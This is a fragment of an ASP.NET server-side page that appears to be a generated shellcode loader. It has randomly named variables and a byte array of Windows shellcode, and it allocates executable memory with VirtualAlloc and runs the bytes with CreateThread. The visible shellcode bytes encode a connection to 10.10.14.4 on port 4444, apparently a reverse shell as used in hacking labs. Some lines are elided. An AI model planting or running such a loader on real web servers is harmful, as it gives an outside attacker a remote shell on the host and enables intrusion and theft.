...
<script runat="server">
    ...
    {
        byte[] iDr41s = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,
...
0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x8b,0x48,0x18,0x50,0x01,0xd3,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x04,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr wpnyu7 = VirtualAlloc(IntPtr.Zero,(UIntPtr)iDr41s.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(iDr41s,0,wpnyu7,iDr41s.Length);
        IntPtr in6UW = IntPtr.Zero;
        IntPtr hmr1xGjrJR = CreateThread(IntPtr.Zero,UIntPtr.Zero,wpnyu7,IntPtr.Zero,0,ref in6UW);
    }
</script>
